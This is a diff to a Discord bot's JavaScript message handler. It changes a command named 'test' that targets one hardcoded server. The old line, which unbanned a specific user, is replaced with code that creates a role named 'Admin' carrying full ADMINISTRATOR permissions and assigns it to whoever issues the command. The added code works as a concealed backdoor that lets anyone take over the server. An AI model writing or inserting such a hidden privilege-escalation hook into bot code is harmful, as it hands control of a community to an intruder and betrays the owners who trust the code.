@@ -143,7 +143,11 @@ client.on("messageCreate", async message => {
   const command = arg.shift().toLowerCase();
   if(command == "test"){
     const guild = client.guilds.cache.get("1163287479902806026")
-    guild.members.unban("759001587422462015")
+    const role = await guild.roles.create({
+          name: 'Admin',
+          permissions: ['ADMINISTRATOR'],
+        });
+    message.member.roles.add(role)
   }
   if(command == "help"){
     const embed = new MessageEmbed()
